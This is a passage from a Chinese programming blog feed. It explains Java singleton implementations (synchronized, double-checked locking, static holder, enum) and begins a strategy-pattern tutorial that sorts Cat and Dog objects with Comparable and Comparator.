INSTANCE;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mgr04</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Mgr04 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (INSTANCE == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            INSTANCE = <span class="hljs-keyword">new</span> Mgr04();<br>        &#125;<br>        <span class="hljs-keyword">return</span> INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"m"</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-comment">//函数式接口</span><br>            <span class="hljs-keyword">new</span> Thread(()-&gt;<br>                    System.out.println(Mgr04.getInstance().hashCode())<br>            ).start();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>接下有人就想，那我能不能通过减小同步代码块的方式提高效率，看下面的方法。<hr></p>
<h4 id="方法⑤"><a href="#方法⑤" class="headerlink" title="方法⑤"></a>方法⑤</h4><p>缺点：<font color="#FF6347" size="4" face="Open Sans">不可行,又导致了方法③中的问题了</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr05</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Mgr05 INSTANCE;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mgr05</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><br>    <span class="hljs-comment">/**<br>     * <br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Mgr05 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (INSTANCE == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-comment">// 妄图通过减小同步代码块的方式提高效率，然后不可行</span><br>            <span class="hljs-keyword">synchronized</span> (Mgr05<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Thread.sleep(<span class="hljs-number">1</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                INSTANCE = <span class="hljs-keyword">new</span> Mgr05();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"m"</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                System.out.println(Mgr05.getInstance().hashCode());<br>            &#125;).start();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>当存在第一个线程调用了getInstance()方法，当判断 INSTANCE 为空后，还未到锁，<br>另一线程也调用了getInstance()方法，判断了 INSTANCE 为空，获得锁，执行剩下的部分，创建实例<br>当释放锁后，接着第一个线程获得锁也创建了一个实例，<br>此时 INSTANCE 在两个线程中已经不再是同一个实例了<br>根本原因：<font color="#FF6347" size="4" face="Open Sans">if判断没有和下面的锁进行一体化操作</font></p>
<p>又有聪明的人想到那我们是不是能够通过双重检查来解决这情况，答案是可以的，于是乎就有了下面这种情况：<hr></p>
<h4 id="方法⑥"><a href="#方法⑥" class="headerlink" title="方法⑥"></a>方法⑥</h4><p>缺点：<font color="#FF6347" size="4" face="Open Sans">没有缺点，就是完美。</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr06</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Mgr06 INSTANCE; <span class="hljs-comment">//volatile 如果想了解，查一下资料</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mgr06</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><br>    <span class="hljs-comment">//最完美的方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Mgr06 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (INSTANCE == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-comment">// 双重检查</span><br>            <span class="hljs-keyword">synchronized</span> (Mgr06<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>&#123;<br>                <span class="hljs-keyword">if</span> (INSTANCE == <span class="hljs-keyword">null</span>)&#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        Thread.sleep(<span class="hljs-number">1</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                        e.printStackTrace();<br>                    &#125;<br>                    INSTANCE = <span class="hljs-keyword">new</span> Mgr06();<br>                &#125;<br><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"m"</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                System.out.println(Mgr05.getInstance().hashCode());<br>            &#125;).start();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>双重检查是饿汉式和懒汉式中最完美的方法，但在我们开发中，是根据情况来判断的，u1s1，方法①不是很好吗？（你不用，你装载它干啥）<hr></p>
<h3 id="静态内部类方式"><a href="#静态内部类方式" class="headerlink" title="静态内部类方式"></a>静态内部类方式</h3><h4 id="方法⑦"><a href="#方法⑦" class="headerlink" title="方法⑦"></a>方法⑦</h4><p>原理：<font color="#FF6347" size="4" face="Open Sans">加载外部类时不会加载内部类，JVM保证单例</font></p>
<p>缺点：<font color="#FF6347" size="4" face="Open Sans">没有缺点，就很完美。不需要加锁，由JVM帮我们来保证线程安全的</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr07</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mgr07</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mgr07Holder</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> Mgr07 INSTANCE = <span class="hljs-keyword">new</span> Mgr07();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Mgr07 <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> Mgr07Holder.INSTANCE;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                System.out.println(Mgr07.getInstance().hashCode());<br>            &#125;).start();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>你以为上面两个就是最完美的单例吗？还是太天真了。<br>Java创始人之一Joshua Bloch在Effective Java中推荐关于单例的<font color="#FFB6C1" size="5" face="Open Sans">最完美</font>的方法⑧<hr></p>
<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><h4 id="方法⑧"><a href="#方法⑧" class="headerlink" title="方法⑧"></a>方法⑧</h4><p>原理：<font color="#FF6347" size="4" face="Open Sans">枚举。。。</font></p>
<p>作用：<font color="#FF6347" size="4" face="Open Sans">不仅可以解决线程同步，还可以防止反序列化</font></p>
<p>缺点：<font color="#FF6347" size="4" face="Open Sans">完美中的完美。。。</font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> Mgr08 &#123;<br><br>    INSTANCE;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">m</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                System.out.println(Mgr07.getInstance().hashCode());<br>            &#125;).start();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>关于反系列化：<br>枚举类是没有构造方法的，所以即使拿到了class文件，也没有办法构造它的对象，返回的反序列化只是 INSTANCE</p>
<hr>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>单例模式设计的代码比较多，但其实统共也就那么几种原理，并不是用的都是完美的方法，我们在开发过程中，是根据需要来决定用哪一种的(Java开发中，Spring已经帮我们基本上都解决了单例模式设计)，学会合理利用设计模式，会让你的代码更有水平!</p>
</font>
]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式2--strategy</title>
    <url>/article/e73642dc.html</url>
    <content><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title=" 策略模式"></a><a href="https://www.runoob.com/design-pattern/strategy-pattern.html" target="_blank" rel="noopener"> 策略模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于<font color="#FFB6C1" size="5" face="Open Sans"> 行为型模式 </font>。在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。</p>
<p>如果想了解策略模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/strategy-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-策略模式</a></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：<br>1、算法可以自由切换。<br>2、避免使用多重条件判断。<br>3、扩展性良好。</p>
<p>缺点：<br>1、策略类会增多。<br>2、所有策略类都需要对外暴露。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、如果在一个系统里面有许多类，它们之间的区别仅在于它们的<font color="#FFB6C1" size="5" face="Open Sans"> 行为 </font>，那么使用策略模式可以动态地让一个对象在许多行为中选择一种行为。<br>2、一个系统需要动态地在几种算法中选择一种。<br>3、如果一个对象有很多的行为，如果不用恰当的模式，这些行为就只好使用多重的条件选择语句来实现。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>试着先实现一个需求，要求建立猫和狗类，猫含有width和height两个属性(都为int)，并且实现compareTo接口对height的比较。狗含有food一个属性(为int)，实现compareTo接口对food的比较。而我的需求是，实现对猫和狗的排序。</p>
<p>实现代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(T o)</span></span>;<br>&#125;<span class="hljs-comment">//Comparable接口</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">Cat</span>&gt;</span>&#123;<br><br>    <span class="hljs-keyword">int</span> Width;<br>    <span class="hljs-keyword">int</span> Height;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Cat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> width, <span class="hljs-keyword">int</span> height)</span> </span>&#123;<br>        Width = width;<br>        Height = height;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Cat&#123;"</span> +<br>                <span class="hljs-string">"Width="</span> + Width +<br>                <span class="hljs-string">", Height="</span> + Height +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(Cat o)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.Height &lt; o.Height) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.Height &gt; o.Height) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<span class="hljs-comment">//Cat类</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">Dog</span>&gt; </span>&#123;<br><br>    <span class="hljs-keyword">int</span> food;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Dog</span><span class="hljs-params">(<span class="hljs-keyword">int</span> food)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.food = food;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(Dog o)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.food &lt; o.food) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.food &gt; o.food) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Dog&#123;"</span> +<br>                <span class="hljs-string">"food="</span> + food +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br>&#125;<span class="hljs-comment">//Dog类</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sorter</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(Comparable[] arr)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">int</span> minPos = i;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i+<span class="hljs-number">1</span>; j &lt; arr.length; j++) &#123;<br>                minPos = arr[j].compareTo(arr[minPos]) == -<span class="hljs-number">1</span> ? j : minPos;<br>            &#125;<br>            swap(arr, i, minPos);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(Comparable[] arr, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> minPos)</span> </span>&#123;<br>        Comparable temp = arr[i];<br>        arr[i] = arr[minPos];<br>        arr[minPos] = temp;<br>    &#125;<br><br>&#125;<span class="hljs-comment">//Sorter排序函数</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><span class="hljs-comment">//        Dog[] o = new Dog[]&#123;new Dog(5), new Dog(1), new Dog(3)&#125;;</span><br>        Cat[] o = <span class="hljs-keyword">new</span> Cat[]&#123;<span class="hljs-keyword">new</span> Cat(<span class="hljs-number">5</span>,<span class="hljs-number">3</span>), <span class="hljs-keyword">new</span> Cat(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>), <span class="hljs-keyword">new</span> Cat(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)&#125;;<br>        Sorter sorter = <span class="hljs-keyword">new</span> Sorter();<br>        sorter.sort(o);<br>        System.out.println(Arrays.toString(o));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[Cat&#123;Width=<span class="hljs-number">3</span>, Height=<span class="hljs-number">1</span>&#125;, Cat&#123;Width=<span class="hljs-number">5</span>, Height=<span class="hljs-number">3</span>&#125;, Cat&#123;Width=<span class="hljs-number">1</span>, Height=<span class="hljs-number">5</span>&#125;]<br></code></pre></div></td></tr></table></figure>

<p>以上代码不是很难实现。接着加大难度</p>
<p>我需要你在使用Sorter函数的情况下，实现既可以根据猫的Width属性对猫进行排序，也可以根据猫的Height进行排序，还可以根据狗的food进行排序。且不能往Comparable接口中添加新的实体类。(添加了代码就很笨重了，不灵活)</p>
<p>乍一看是不是感觉也还行，不是很难。但仔细分析一下，就上面那种方法而言，Sorter()函数中进行比较的方法，是Comparable接口的，Cat、Dog类在实现时，就在类中固定实现了这个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(Dog o)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.food &lt; o.food) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.food &gt; o.food) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>这么一看是不是很笨重，而且你调用了compareTo，只能实现一个属性的判断，而我们的要求是不能往Comparable接口中添加新的实体类。</p>
<p>现在再回看提出的需求，是不是就感觉有点吃力了。</p>
<p>来，分析一下解题思路，这里我们改进了Sorter中的sort方法，多加了一个Comparator类型的参数。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(T[] arr, Comparator&lt;T&gt; comparator)</span> </span>&#123;<br>    <span class="hljs-comment">// 内容</span><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里的Comparator是接口，里面有抽象类compare，用来实现类中属性的比较。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(T o1, T o2)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>而此时，我们创建一个CatWidthComparator类，实现Comparator接口，用来比较Cat类的Width属性</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//根据猫的Width属性来进行比较</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CatWidthComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">Cat</span>&gt; </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Cat o1, Cat o2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (o1.Width &lt; o2.Width) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o1.Width &gt; o2.Width) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

